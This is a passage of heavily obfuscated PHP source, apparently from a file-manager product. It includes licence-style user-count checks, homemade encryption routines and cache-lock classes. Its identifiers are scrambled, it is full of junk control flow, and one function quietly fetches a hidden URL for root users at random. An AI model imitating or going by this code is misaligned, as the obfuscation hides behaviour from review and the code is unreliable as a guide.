json_decode($¾Şî…ú×, !0); $åè«¶Î = $¸êÂ¶‡[753]; } private function xenu9e4a4180() { $÷à¹ë½ˆ =& $_SERVER[ùèÅ´Ãš]; $Ë×«Èë =& $_SERVER[å‚ŞÇ•]; $ÆşÍ»Æ“ = array($Ë×«Èë[270] => $Ë×«Èë[271], $Ë×«Èë[272] => $Ë×«Èë[273], $Ë×«Èë[274] => $Ë×«Èë[275], $Ë×«Èë[276] => $Ë×«Èë[277], $Ë×«Èë[278] => $Ë×«Èë[279], $Ë×«Èë[280] => $Ë×«Èë[214], $Ë×«Èë[281] => $Ë×«Èë[214], $Ë×«Èë[282] => $Ë×«Èë[271], $Ë×«Èë[283] => $Ë×«Èë[273], $Ë×«Èë[284] => $Ë×«Èë[275], $Ë×«Èë[285] => $Ë×«Èë[286], $Ë×«Èë[287] => $Ë×«Èë[277], $Ë×«Èë[288] => $Ë×«Èë[289], $Ë×«Èë[290] => $Ë×«Èë[279], $Ë×«Èë[291] => $Ë×«Èë[292], $Ë×«Èë[293] => $Ë×«Èë[294], $Ë×«Èë[295] => $Ë×«Èë[296]); $ı©”¤×— = $÷à¹ë½ˆ[754]; if (strlen($ı©”¤×—) < $÷à¹ë½ˆ[695]) { return; } $şÊà³ß³ = $ÆşÍ»Æ“[$this->tschfe659f74]; $ÃÇ¹İ = $÷à¹ë½ˆ[755]; if (!$ÃÇ¹İ) { die; } $şÊà³ß³ = intval($şÊà³ß³ ? $şÊà³ß³ : $Ë×«Èë[271]); $ı©ùÄğ¼ = $÷à¹ë½ˆ[756]; while (strlen($ı©ùÄğ¼) < $÷à¹ë½ˆ[697]) { if (!$ı©ùÄğ¼) { break; } $ı©ùÄğ¼++; } $‹›ÛÕÚ = _get($this->gkzn312c58de, $Ë×«Èë[297]); $‹›ÛÕÚ = $‹›ÛÕÚ ? intval($‹›ÛÕÚ) : 0; return $şÊà³ß³ + $‹›ÛÕÚ; } public function pidc9641c2f4($´äÙæÚ™) { $ÛÀÜ ôâ =& $_SERVER[ùèÅ´Ãš]; $Å’ÌÌ‰© =& $_SERVER[å‚ŞÇ•]; $Ä”ëÙÑÔ = $this->xenu9e4a4180(); $È¬´õÖñ = $ÛÀÜ ôâ[757]; while ($È¬´õÖñ < $ÛÀÜ ôâ[697]) { if ($È¬´õÖñ >= 0) { break; } $È¬´õÖñ++; } if ($´äÙæÚ™[$Å’ÌÌ‰©[298]] == $Å’ÌÌ‰©[122]) { return; } if ($Ä”ëÙÑÔ >= intval($Å’ÌÌ‰©[214])) { return; } $Ğ²ìÑïÚ = Model($Å’ÌÌ‰©[125])->count(); $×è‚ÑÖ = $ÛÀÜ ôâ[758]; if (!$×è‚ÑÖ) { die; } if ($Ğ²ìÑïÚ <= $Ä”ëÙÑÔ) { return; } $¾í¡¿Ø = Model($Å’ÌÌ‰©[125])->field($Å’ÌÌ‰©[298])->limit($Ä”ëÙÑÔ)->select(); $¹îúÃÕ˜ = $ÛÀÜ ôâ[759]; while ($¹îúÃÕ˜ < $ÛÀÜ ôâ[693]) { if ($¹îúÃÕ˜ >= 0) { break; } $¹îúÃÕ˜++; } $¾í¡¿Ø = array_to_keyvalue($¾í¡¿Ø, $Å’ÌÌ‰©[6], $Å’ÌÌ‰©[298]); if (!in_array($´äÙæÚ™[$Å’ÌÌ‰©[298]], $¾í¡¿Ø)) { show_json($Å’ÌÌ‰©[299], !1, $Å’ÌÌ‰©[210]); } } public function gjlmd00e6ece() { $·ãïèşÄ =& $_SERVER[ùèÅ´Ãš]; $óìè²ÃØ =& $_SERVER[å‚ŞÇ•]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ù‘ıÇÇ× = $óìè²ÃØ[217]; $€‚Æš• = $·ãïèşÄ[760]; if (!$€‚Æš•) { die; } $ù‘ıÇÇ× = $this->wqdnb36f692d($ù‘ıÇÇ×, $óìè²ÃØ[218]); $ö¨ºêÖ = $·ãïèşÄ[761]; $«ÅõãÄí = stream_context_create(array($óìè²ÃØ[219] => array($óìè²ÃØ[220] => $óìè²ÃØ[221], $óìè²ÃØ[222] => 3))); $‰›‡´›’ = $·ãïèşÄ[762]; if (!$‰›‡´›’) { die; } $‹óœÌ°Î = @file_get_contents($ù‘ıÇÇ×, !1, $«ÅõãÄí); $ÉÀĞã•• = $·ãïèşÄ[763]; if (!$ÉÀĞã••) { die; } echo $óìè²ÃØ[300] . hash_encode($‹óœÌ°Î) . $óìè²ÃØ[301]; } private function ayodf0bff992($óÕÔñ“, $ÅŸëõ¢ , $È’¾šú• = 3) { $€“²ıÌ‚ =& $_SERVER[ùèÅ´Ãš]; $Èæ¡¿“Ú =& $_SERVER[å‚ŞÇ•]; usleep(1); $ ¹¨¶¹Ş = $€“²ıÌ‚[764]; while ($ ¹¨¶¹Ş < $€“²ıÌ‚[704]) { if ($ ¹¨¶¹Ş >= 0) { break; } $ ¹¨¶¹Ş++; } $óÕÔñ“ = trim($óÕÔñ“); $Ó«™¾©ü = mt_rand(0, 5) . $Èæ¡¿“Ú[6]; $¿ê´“»ï = $€“²ıÌ‚[765]; while ($¿ê´“»ï < $€“²ıÌ‚[700]) { if ($¿ê´“»ï >= 0) { break; } $¿ê´“»ï++; } $²ôä‘Ò˜ = rand_string(15); $ü›ÅëŞº = $€“²ıÌ‚[766]; while ($ü›ÅëŞº < $€“²ıÌ‚[693]) { if ($ü›ÅëŞº >= 0) { break; } $ü›ÅëŞº++; } $Ç€¯Ôşí = $Èæ¡¿“Ú[302]; switch ($Ó«™¾©ü) { case $Èæ¡¿“Ú[206]: $æ±×ëÍ = $this->qerj15d7beb8($óÕÔñ“, strrev($ÅŸëõ¢  . $²ôä‘Ò˜)); $º¦¥ùø = $€“²ıÌ‚[767]; if (strlen($º¦¥ùø) < $€“²ıÌ‚[697]) { die; } break; case $Èæ¡¿“Ú[122]: $æ±×ëÍ = $this->qerj15d7beb8($óÕÔñ“, strrev($²ôä‘Ò˜ . $ÅŸëõ¢ )); $§è÷°Ó¤ = $€“²ıÌ‚[768]; if (!$§è÷°Ó¤) { return; } break; case $Èæ¡¿“Ú[303]: $æ±×ëÍ = $this->qerj15d7beb8($óÕÔñ“, base64_encode($²ôä‘Ò˜ . $ÅŸëõ¢ )); break; $»àŠ¹ˆ™ = $€“²ıÌ‚[769]; while ($»àŠ¹ˆ™ < $€“²ıÌ‚[700]) { if ($»àŠ¹ˆ™ >= 0) { break; } $»àŠ¹ˆ™++; } case $Èæ¡¿“Ú[304]: $æ±×ëÍ = $this->qerj15d7beb8($óÕÔñ“, md5($²ôä‘Ò˜ . $ÅŸëõ¢ )); break; $ëËœ¬Æ  = $€“²ıÌ‚[770]; while (strlen($ëËœ¬Æ ) < $€“²ıÌ‚[704]) { if (!$ëËœ¬Æ ) { break; } $ëËœ¬Æ ++; } case $Èæ¡¿“Ú[305]: $óÕÔñ“ = base64_encode($óÕÔñ“); $¦Õèº¸ğ = rand(0, 64); $ğµàÚÄ• = $€“²ıÌ‚[771]; if (!$ğµàÚÄ•) { return; } $Ùƒè”Å™ = $Ç€¯Ôşí[$¦Õèº¸ğ]; $©ÊûïÑ = md5($Ùƒè”Å™ . md5($ÅŸëõ¢  . $Ùƒè”Å™) . $ÅŸëõ¢ ); $©ÊûïÑ = substr($©ÊûïÑ, $¦Õèº¸ğ % 8, $¦Õèº¸ğ % 8 + 7); $±¯óæÄ  = $Èæ¡¿“Ú[6]; $¾ ÃœÏß = 0; $É†¡Äëê = 0; $û­÷æ’à = $€“²ıÌ‚[772]; while (strlen($û­÷æ’à) < $€“²ıÌ‚[697]) { if (!$û­÷æ’à) { break; } $û­÷æ’à++; } $ üŞˆÂÉ = 0; $”šŠ´ã¹ = $€“²ıÌ‚[773]; for ($¾ ÃœÏß = 0; $¾ ÃœÏß < strlen($óÕÔñ“); $¾ ÃœÏß++) { $ üŞˆÂÉ = $ üŞˆÂÉ == strlen($©ÊûïÑ) ? 0 : $ üŞˆÂÉ; $å•‹÷Ÿ = $€“²ıÌ‚[774]; if (strlen($å•‹÷Ÿ) < $€“²ıÌ‚[697]) { return; } $É†¡Äëê = ($¦Õèº¸ğ + strpos($Ç€¯Ôşí, $óÕÔñ“[$¾ ÃœÏß]) + ord($©ÊûïÑ[$ üŞˆÂÉ++])) % 64; $“ï€ä²¹ = $€“²ıÌ‚[775]; if (!$“ï€ä²¹) { return; } $±¯óæÄ  .= $Ç€¯Ôşí[$É†¡Äëê]; } $æ±×ëÍ = hash_encode($Ùƒè”Å™ . $±¯óæÄ ); break; $óıÄäş = $€“²ıÌ‚[776]; while ($óıÄäş < $€“²ıÌ‚[704]) { if ($óıÄäş >= 0) { break; } $óıÄäş++; } default: $æ±×ëÍ = $this->qerj15d7beb8($óÕÔñ“, $ÅŸëõ¢  . $²ôä‘Ò˜); $Š×»¸ÉÖ = $€“²ıÌ‚[777]; if (strlen($Š×»¸ÉÖ) < $€“²ıÌ‚[693]) { die; } break; $Ë•ò­Ó¤ = $€“²ıÌ‚[778]; if (!$Ë•ò­Ó¤) { die; } } $æ±×ëÍ = strrev($Ó«™¾©ü . $²ôä‘Ò˜ . $æ±×ëÍ); $«Ñ¨´Šò = $€“²ıÌ‚[779]; while (strlen($«Ñ¨´Šò) < $€“²ıÌ‚[700]) { if (!$«Ñ¨´Šò) { break; } $«Ñ¨´Šò++; } if ($È’¾šú• - 1 > 0) { $æ±×ëÍ = $this->ayodf0bff992($æ±×ëÍ, $ÅŸëõ¢ , $È’¾šú• - 1); } return $æ±×ëÍ; } private function msice72ac6de($æòå¶Øè, $¾¾—Óš¸, $¹ĞÆ¥ø¦ = 3) { $è¯ˆ½«Á =& $_SERVER[ùèÅ´Ãš]; $ãĞàØê˜ =& $_SERVER[å‚ŞÇ•]; if (!is_string($æòå¶Øè) || strlen($æòå¶Øè) < 10) { return !1; } $æòå¶Øè = trim($æòå¶Øè); $æòå¶Øè = strrev($æòå¶Øè); $ß¢¬¢‰· = $è¯ˆ½«Á[780]; if (!$ß¢¬¢‰·) { die; } $÷û›×“· = $æòå¶Øè[0]; $†ğ¯¾…Ø = $è¯ˆ½«Á[781]; if (!$†ğ¯¾…Ø) { die; } $ÄÊÑ’˜è = substr($æòå¶Øè, 1, 15); $æòå¶Øè = substr($æòå¶Øè, 16); $”µıÁÈú = $è¯ˆ½«Á[782]; if (strlen($”µıÁÈú) < $è¯ˆ½«Á[697]) { die; } $Ğ¨ö…×à = $ãĞàØê˜[302]; switch ($÷û›×“·) { case $ãĞàØê˜[206]: $ú¼î¨Î = $this->wqdnb36f692d($æòå¶Øè, strrev($¾¾—Óš¸ . $ÄÊÑ’˜è)); $Úïáùºô = $è¯ˆ½«Á[783]; if (strlen($Úïáùºô) < $è¯ˆ½«Á[695]) { die; } break; $¬İıÓÜ¿ = $è¯ˆ½«Á[696]; if (!$¬İıÓÜ¿) { die; } case $ãĞàØê˜[122]: $ú¼î¨Î = $this->wqdnb36f692d($æòå¶Øè, strrev($ÄÊÑ’˜è . $¾¾—Óš¸)); $ÓÊŞ›’¼ = $è¯ˆ½«Á[784]; if (strlen($ÓÊŞ›’¼) < $è¯ˆ½«Á[695]) { return; } break; $â„Ş‹ª¹ = $è¯ˆ½«Á[785]; while (strlen($â„Ş‹ª¹) < $è¯ˆ½«Á[695]) { if (!$â„Ş‹ª¹) { break; } $â„Ş‹ª¹++; } case $ãĞàØê˜[303]: $ú¼î¨Î = $this->wqdnb36f692d($æòå¶Øè, base64_encode($ÄÊÑ’˜è . $¾¾—Óš¸)); $öú’°Æì = $è¯ˆ½«Á[786]; if (strlen($öú’°Æì) < $è¯ˆ½«Á[700]) { die; } break; case $ãĞàØê˜[304]: $ú¼î¨Î = $this->wqdnb36f692d($æòå¶Øè, md5($ÄÊÑ’˜è . $¾¾—Óš¸)); break; $õÖºäÉ¹ = $è¯ˆ½«Á[712]; while ($õÖºäÉ¹ < $è¯ˆ½«Á[697]) { if ($õÖºäÉ¹ >= 0) { break; } $õÖºäÉ¹++; } case $ãĞàØê˜[305]: $æòå¶Øè = hash_decode($æòå¶Øè); $ÇÜŸ’¬ = $è¯ˆ½«Á[787]; $‰«Á·í¡ = $æòå¶Øè[0]; $æòå¶Øè = substr($æòå¶Øè, 1); $şŒÃÖ†ş = strpos($Ğ¨ö…×à, $‰«Á·í¡); $—¿š²€¶ = $è¯ˆ½«Á[788]; if (!$—¿š²€¶) { die; } $Å á˜ØÊ = md5($‰«Á·í¡ . md5($¾¾—Óš¸ . $‰«Á·í¡) . $¾¾—Óš¸); $Îö‚•†• = $è¯ˆ½«Á[789]; $Å á˜ØÊ = substr($Å á˜ØÊ, $şŒÃÖ†ş % 8, $şŒÃÖ†ş % 8 + 7); $ÚÄ¼Æ¨Ñ = $è¯ˆ½«Á[790]; if (!$ÚÄ¼Æ¨Ñ) { return; } $Á—·²ƒÏ = $ãĞàØê˜[6]; $¡˜úŞÆ± = 0; $­™İ¡ƒÕ = $è¯ˆ½«Á[791]; $Êº¡‘÷‡ = 0; $›€¡ò¤ = 0; $œ²•–õ– = $è¯ˆ½«Á[792]; if (strlen($œ²•–õ–) < $è¯ˆ½«Á[700]) { return; } for ($¡˜úŞÆ± = 0; $¡˜úŞÆ± < strlen($æòå¶Øè); $¡˜úŞÆ±++) { $›€¡ò¤ = $›€¡ò¤ == strlen($Å á˜ØÊ) ? 0 : $›€¡ò¤; $ÁöôÈõ = $è¯ˆ½«Á[793]; if (!$ÁöôÈõ) { return; } $à·§ş = $›€¡ò¤++; $İåóÂ§Ğ = $è¯ˆ½«Á[794]; while (strlen($İåóÂ§Ğ) < $è¯ˆ½«Á[697]) { if (!$İåóÂ§Ğ) { break; } $İåóÂ§Ğ++; } $Êº¡‘÷‡ = strpos($Ğ¨ö…×à, $æòå¶Øè[$¡˜úŞÆ±]) - $şŒÃÖ†ş - ord($Å á˜ØÊ[$à·§ş]); $ñÌïÓ¹ß = $è¯ˆ½«Á[795]; if (!$ñÌïÓ¹ß) { return; } while ($Êº¡‘÷‡ < 0) { $Êº¡‘÷‡ += 64; $˜œ‰‘« = $è¯ˆ½«Á[796]; if (!$˜œ‰‘«) { return; } } $Á—·²ƒÏ .= $Ğ¨ö…×à[$Êº¡‘÷‡]; $ÃäîæÚ— = $è¯ˆ½«Á[797]; while ($ÃäîæÚ— < $è¯ˆ½«Á[700]) { if ($ÃäîæÚ— >= 0) { break; } $ÃäîæÚ—++; } } $ú¼î¨Î = base64_decode($Á—·²ƒÏ); break; $¡‚œøäš = $è¯ˆ½«Á[798]; default: $ú¼î¨Î = $this->wqdnb36f692d($æòå¶Øè, $¾¾—Óš¸ . $ÄÊÑ’˜è); break; } if ($¹ĞÆ¥ø¦ - 1 > 0) { $ú¼î¨Î = $this->msice72ac6de($ú¼î¨Î, $¾¾—Óš¸, $¹ĞÆ¥ø¦ - 1); } return $ú¼î¨Î; } public function sluybf204525($èÊËöü) { $ªØ€’ú  =& $_SERVER[ùèÅ´Ãš]; $¹®¶ÄÑö =& $_SERVER[å‚ŞÇ•]; $ù‰°§¾õ = $this->uktqdbb4f68b(); $™Â¾†ˆÎ = $this->uktqdbb4f68b(); $·ç²Ãú¡ = $ªØ€’ú [799]; $áğ¦º­‘ = ($ù‰°§¾õ - 1) * ($™Â¾†ˆÎ - 1); $Ğ¸É¬Ú€ = intval(($ù‰°§¾õ + $™Â¾†ˆÎ) / 2); $Ş’úè‰¼ = $ªØ€’ú [800]; if (!$Ş’úè‰¼) { return; } while (1) { $·€Æ¢±Ü = $Ğ¸É¬Ú€; $ĞÉêô‚» = $ªØ€’ú [801]; while (strlen($ĞÉêô‚») < $ªØ€’ú [704]) { if (!$ĞÉêô‚») { break; } $ĞÉêô‚»++; } $¸‚÷É‹Ü = $áğ¦º­‘; while ($¸‚÷É‹Ü % $·€Æ¢±Ü != 0) { $ÌŞŸ»Š = $¸‚÷É‹Ü; $¸‚÷É‹Ü = $·€Æ¢±Ü; $·€Æ¢±Ü = $ÌŞŸ»Š % $·€Æ¢±Ü; } if ($·€Æ¢±Ü == 1) { break; } else { $Ğ¸É¬Ú€++; } } $îÛØ××Í = 2; for ($İ‘˜Ç“ü = 0; $İ‘˜Ç“ü < $áğ¦º­‘ * 10; $İ‘˜Ç“ü++) { if (($áğ¦º­‘ * $İ‘˜Ç“ü + 1) % $Ğ¸É¬Ú€ == 0) { $îÛØ××Í = intval(($áğ¦º­‘ * $İ‘˜Ç“ü + 1) / $Ğ¸É¬Ú€); break; } } $¹Â°×“Œ = $this->qerj15d7beb8($ù‰°§¾õ * $™Â¾†ˆÎ . $¹®¶ÄÑö[6], $¹®¶ÄÑö[136]); $’ç†ÀÚÌ = $ªØ€’ú [802]; if (strlen($’ç†ÀÚÌ) < $ªØ€’ú [693]) { die; } $½´ıåã = md5($¹®¶ÄÑö[306] . ($ù‰°§¾õ + $™Â¾†ˆÎ) . $¹®¶ÄÑö[307] . $Ğ¸É¬Ú€ . $¹®¶ÄÑö[307] . $îÛØ××Í . $¹®¶ÄÑö[308]); $²„—€¼¾ = $this->qerj15d7beb8($èÊËöü, $½´ıåã) . $¹®¶ÄÑö[309] . $¹Â°×“Œ; return $²„—€¼¾; $òÔÆ±·Á = $ªØ€’ú [803]; while ($òÔÆ±·Á < $ªØ€’ú [700]) { if ($òÔÆ±·Á >= 0) { break; } $òÔÆ±·Á++; } } public function erqa710aa79a($˜¿ÉØ¥…) { $«Ôœ§€ =& $_SERVER[ùèÅ´Ãš]; $ß•Æ¶ı› =& $_SERVER[å‚ŞÇ•]; $±ƒîúı† = explode($ß•Æ¶ı›[309], $˜¿ÉØ¥…); $Ú“ÔÊåË = $«Ôœ§€[804]; if (count($±ƒîúı†) != 2) { return $ß•Æ¶ı›[6]; } $‡ûÏ©‰¡ = $this->wqdnb36f692d($±ƒîúı†[1] . $ß•Æ¶ı›[6], $ß•Æ¶ı›[136]); $·„é‚Ëø = $«Ôœ§€[805]; if (strlen($·„é‚Ëø) < $«Ôœ§€[693]) { die; } if (!$‡ûÏ©‰¡) { return $ß•Æ¶ı›[6]; } $‡ûÏ©‰¡ = intval($‡ûÏ©‰¡); $òò¤¸’ = $«Ôœ§€[806]; while ($òò¤¸’ < $«Ôœ§€[695]) { if ($òò¤¸’ >= 0) { break; } $òò¤¸’++; } $˜°¼ƒà† = 0; $¹‚§˜ØĞ = $«Ôœ§€[807]; if (!$¹‚§˜ØĞ) { return; } $í¯÷›øı = 0; $ÑÃ—áôÄ = $«Ôœ§€[808]; if (!$ÑÃ—áôÄ) { return; } for ($ÈµÖøş‘ = 3; $ÈµÖøş‘ < $‡ûÏ©‰¡; $ÈµÖøş‘ += 2) { if ($‡ûÏ©‰¡ % $ÈµÖøş‘ != 0) { continue; } $˜°¼ƒà† = $ÈµÖøş‘; $íñÖëÙº = $«Ôœ§€[809]; if (!$íñÖëÙº) { return; } $í¯÷›øı = intval($‡ûÏ©‰¡ / $ÈµÖøş‘); $ÇŸûæœş = $«Ôœ§€[810]; break; $‡‰¦õæö = $«Ôœ§€[811]; if (strlen($‡‰¦õæö) < $«Ôœ§€[704]) { return; } } $ğ·ï = ($˜°¼ƒà† - 1) * ($í¯÷›øı - 1); $ƒóîáÆ = $«Ôœ§€[812]; while (strlen($ƒóîáÆ) < $«Ôœ§€[693]) { if (!$ƒóîáÆ) { break; } $ƒóîáÆ++; } $ë™–áª = intval(($˜°¼ƒà† + $í¯÷›øı) / 2); $ƒãÉÇßÍ = $«Ôœ§€[813]; while (1) { $€›ıöØ– = $ë™–áª; $£©Ñ§ = $«Ôœ§€[814]; if (strlen($£©Ñ§) < $«Ôœ§€[695]) { return; } $æñ““îî = $ğ·ï; $Ñ‡¦ßé† = $«Ôœ§€[815]; while ($æñ““îî % $€›ıöØ– != 0) { $ÑşÔøµ¨ = $æñ““îî; $ùàõè = $«Ôœ§€[816]; if (!$ùàõè) { die; } $æñ““îî = $€›ıöØ–; $€›ıöØ– = $ÑşÔøµ¨ % $€›ıöØ–; $óÒ“Æ½ = $«Ôœ§€[817]; if (!$óÒ“Æ½) { die; } } if ($€›ıöØ– == 1) { break; } else { $ë™–áª++; } } $»±±í¦½ = 2; for ($ÈµÖøş‘ = 0; $ÈµÖøş‘ < $ğ·ï * 10; $ÈµÖøş‘++) { if (($ğ·ï * $ÈµÖøş‘ + 1) % $ë™–áª == 0) { $»±±í¦½ = intval(($ğ·ï * $ÈµÖøş‘ + 1) / $ë™–áª); break; } } $Ÿ›Šö‘ï = md5($ß•Æ¶ı›[306] . ($˜°¼ƒà† + $í¯÷›øı) . $ß•Æ¶ı›[307] . $ë™–áª . $ß•Æ¶ı›[307] . $»±±í¦½ . $ß•Æ¶ı›[308]); $Ù¡¬õ´Ş = $this->wqdnb36f692d($±ƒîúı†[0], $Ÿ›Šö‘ï); $€ù¢‡ Ö = $«Ôœ§€[818]; while (strlen($€ù¢‡ Ö) < $«Ôœ§€[693]) { if (!$€ù¢‡ Ö) { break; } $€ù¢‡ Ö++; } return $Ù¡¬õ´Ş; } public function uktqdbb4f68b() { $§ğøı‹´ =& $_SERVER[ùèÅ´Ãš]; $Ûš…§€ = mt_rand(pow(2, 14), pow(2, 16) - 1); $á´œíÍÚ = $§ğøı‹´[819]; while ($á´œíÍÚ < $§ğøı‹´[695]) { if ($á´œíÍÚ >= 0) { break; } $á´œíÍÚ++; } $èª—ÛŞ = array(); $Öóò©•ï = $§ğøı‹´[696]; while ($Öóò©•ï < $§ğøı‹´[693]) { if ($Öóò©•ï >= 0) { break; } $Öóò©•ï++; } $×ÓĞØÍœ = 1; $Ä˜­¿“÷ = $§ğøı‹´[820]; if (strlen($Ä˜­¿“÷) < $§ğøı‹´[700]) { return; } while ($×ÓĞØÍœ <= (int) sqrt($Ûš…§€)) { $°±˜ Ô = $×ÓĞØÍœ; $†•õñ»ˆ = $§ğøı‹´[821]; if (strlen($†•õñ»ˆ) < $§ğøı‹´[695]) { die; } while (!0) { $°±˜ Ô++; $à´êšÀà = $§ğøı‹´[822]; if ($°±˜ Ô <= 2) { $×ÓĞØÍœ = $°±˜ Ô; break; } else { if ($°±˜ Ô < 2) { continue; } } $‰Å¼Ş¨‘ = !0; for ($­àîöÌ = 2; $­àîöÌ <= sqrt($°±˜ Ô); $­àîöÌ++) { if ($°±˜ Ô % $­àîöÌ == 0) { $‰Å¼Ş¨‘ = !1; } } if ($‰Å¼Ş¨‘) { $×ÓĞØÍœ = $°±˜ Ô; break; } } $èª—ÛŞ[] = $×ÓĞØÍœ; } $º“ı½± = 2; $Ë’ÌÛ»Â = $§ğøı‹´[823]; if (strlen($Ë’ÌÛ»Â) < $§ğøı‹´[697]) { return; } for ($°±˜ Ô = $Ûš…§€; $°±˜ Ô > 1; $°±˜ Ô--) { $‰Å¼Ş¨‘ = !0; foreach ($èª—ÛŞ as $¢ÅìÏ×) { if ($°±˜ Ô % $¢ÅìÏ× == 0) { $‰Å¼Ş¨‘ = !1; break; } } if ($‰Å¼Ş¨‘) { $º“ı½± = $°±˜ Ô; break; } } return $º“ı½±; } public function oescce97384b($ğß™Š›•, $íØ¶ãõ—) { $»ëĞŒ½ =& $_SERVER[å‚ŞÇ•]; return call_user_func(array($»ëĞŒ½[8], $»ëĞŒ½[310]), $ğß™Š›•, $íØ¶ãõ—); } public function qerj15d7beb8($Ç¶£şÇ×, $¢Ùè„Ë) { $§¶¦çş =& $_SERVER[å‚ŞÇ•]; return call_user_func(array($§¶¦çş[311], $§¶¦çş[312]), $Ç¶£şÇ×, $¢Ùè„Ë); $éªì”çç = $_SERVER[ùèÅ´Ãš][824]; if (!$éªì”çç) { die; } } public function wqdnb36f692d($ÏƒŸ•´™, $ŸŒ¥²Ô) { $Òı©ÖçØ =& $_SERVER[å‚ŞÇ•]; return call_user_func(array($Òı©ÖçØ[311], $Òı©ÖçØ[313]), $ÏƒŸ•´™, $ŸŒ¥²Ô); } } goto a£†ÅŠäŒ; FÉ¶¾‘ƒæ˜: class CacheLockRedis { public function lock($ùÆĞã†…, $öâŸãñ€ = 10) { $¦½¼ë† = Cache::init(); $—ı™¢‘Ğ = microtime(!0) + $öâŸãñ€; while (microtime(!0) < $—ı™¢‘Ğ) { $½ÔÒ÷œö = $¦½¼ë†->get($ùÆĞã†…); if (!$½ÔÒ÷œö) { $‹ĞÒš– = $¦½¼ë†->setLock($ùÆĞã†…, $—ı™¢‘Ğ, $öâŸãñ€); if ($‹ĞÒš–) { return !0; } } else { if ($½ÔÒ÷œö < microtime(!0)) { $¦½¼ë†->set($ùÆĞã†…, $—ı™¢‘Ğ, $öâŸãñ€ * 2); if ($¦½¼ë†->get($ùÆĞã†…) === $½ÔÒ÷œö) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($»µ™Å«Ë) { return Cache::init()->get($»µ™Å«Ë); } public function unlock($ˆ®Ùò£ı) { return Cache::init()->remove($ˆ®Ùò£ı); } } class CacheLockMemcached { public function lock($Î…ªŸı, $ÙÙ©€ç° = 0) { $§ÙÁÀª¥ = Cache::init(); $şÇÖ•²ë = microtime(!0) + $ÙÙ©€ç°; while (microtime(!0) < $şÇÖ•²ë) { $²ÂÄ…ëÖ = $§ÙÁÀª¥->get($Î…ªŸı); if (!$²ÂÄ…ëÖ || $²ÂÄ…ëÖ < microtime(!0)) { $íÉÕ‡¯û = $§ÙÁÀª¥->handle->add($Î…ªŸı, $şÇÖ•²ë, $ÙÙ©€ç°); if ($íÉÕ‡¯û) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ƒãåô±) { return Cache::init()->get($ƒãåô±); } public function unlock($ÓËòÖÃ¼) { return Cache::init()->remove($ÓËòÖÃ¼); } } class CacheLockDatabase { public function lock($°’á, $òÃ¶´ – = 0) { $×ê›ù = Model($_SERVER[ùèÅ´Ãš][912]); $á•ğÁ¶ = microtime(!0) + $òÃ¶´ –; while (microtime(!0) < $á•ğÁ¶) { $¾¼©‘ú = $×ê›ù->get($°’á); if (!$¾¼©‘ú || $¾¼©‘ú < microtime(!0)) { $Ó»––°ë = $×ê›ù->set($°’á, $á•ğÁ¶); if ($Ó»––°ë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($½ƒçÎ…Ì) { return Model($_SERVER[ùèÅ´Ãš][912])->get($½ƒçÎ…Ì); } public function unlock($¾­‹™—¹) { Model($_SERVER[ùèÅ´Ãš][912])->remove($¾­‹™—¹); } } goto e¼Ã³¾¸ì; cŞ§ÙçæĞİ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ğìÍŠÎÊ) { $İ¬×Æ§Ô =& $_SERVER[ùèÅ´Ãš]; if (!$this->allowLock()) { return; } $this->_lockCheck($İ¬×Æ§Ô[625], $ğìÍŠÎÊ); $¯ı½¹–® = 1; $this->_lockEvent($ğìÍŠÎÊ, array($İ¬×Æ§Ô[626], $İ¬×Æ§Ô[627]), $¯ı½¹–®); $this->_lockParent($ğìÍŠÎÊ, array($İ¬×Æ§Ô[627]), $¯ı½¹–®); $this->_lockEvent($ğìÍŠÎÊ, array($İ¬×Æ§Ô[628], $İ¬×Æ§Ô[629]), $¯ı½¹–®); $this->_lockCheckEnd($İ¬×Æ§Ô[625], $ğìÍŠÎÊ); } public function lockCopyEnd($¾ĞßşØŸ) { $ëƒ ÷Öè =& $_SERVER[ùèÅ´Ãš]; if (!$this->allowLock()) { return; } $Ğ˜Òüà = 0; $this->_lockEvent($¾ĞßşØŸ, array($ëƒ ÷Öè[626], $ëƒ ÷Öè[627]), $Ğ˜Òüà); $this->_lockParent($¾ĞßşØŸ, array($ëƒ ÷Öè[627]), $Ğ˜Òüà); $this->_lockEvent($¾ĞßşØŸ, array($ëƒ ÷Öè[628], $ëƒ ÷Öè[629]), $Ğ˜Òüà); } public function lockWriteStart($Ä°÷ê†§, $¨óÖ¥¯Ü = '') { $üÉ¬İÃ =& $_SERVER[ùèÅ´Ãš]; if (!$this->allowLock()) { return; } $this->_lockCheck($üÉ¬İÃ[626], $Ä°÷ê†§); $»ê‚ì˜Ü = 1; $this->_lockKey($üÉ¬İÃ[630] . $Ä°÷ê†§ . $üÉ¬İÃ[10] . $¨óÖ¥¯Ü, $»ê‚ì˜Ü); $this->_lockEvent($Ä°÷ê†§, array($üÉ¬İÃ[625], $üÉ¬İÃ[627]), $»ê‚ì˜Ü); $this->_lockParent($Ä°÷ê†§, array($üÉ¬İÃ[625], $üÉ¬İÃ[627]), $»ê‚ì˜Ü); $this->_lockCheckEnd($üÉ¬İÃ[626], $Ä°÷ê†§); } public function lockWriteEnd($ùûáÊÃŠ, $ÇËÌ›—’ = '') { $¨ìöŞûí =& $_SERVER[ùèÅ´Ãš]; if (!$this->allowLock()) { return; } $œ¹‡Óª… = 0; $this->_lockKey($¨ìöŞûí[630] . $ùûáÊÃŠ . $¨ìöŞûí[10] . $ÇËÌ›—’, $œ¹‡Óª…); $this->_lockEvent($ùûáÊÃŠ, array($¨ìöŞûí[625], $¨ìöŞûí[627]), $œ¹‡Óª…); $this->_lockParent($ùûáÊÃŠ, array($¨ìöŞûí[625], $¨ìöŞûí[627]), $œ¹‡Óª…); } public function lockMoveStart($ÇÑš¼‘–) { $áş¥¹âã =& $_SERVER[ùèÅ´Ãš]; if (!$this->allowLock()) { return; } $this->_lockCheck($áş¥¹âã[627], $ÇÑš¼‘–); $¯«™¬Ëé = 1; $this->_lockKey($áş¥¹âã[631] . $ÇÑš¼‘–, $¯«™¬Ëé); $this->_lockEvent($ÇÑš¼‘–, array($áş¥¹âã[625], $áş¥¹âã[626]), $¯«™¬Ëé); $this->_lockParent($ÇÑš¼‘–, array($áş¥¹âã[625], $áş¥¹âã[627]), $¯«™¬Ëé); 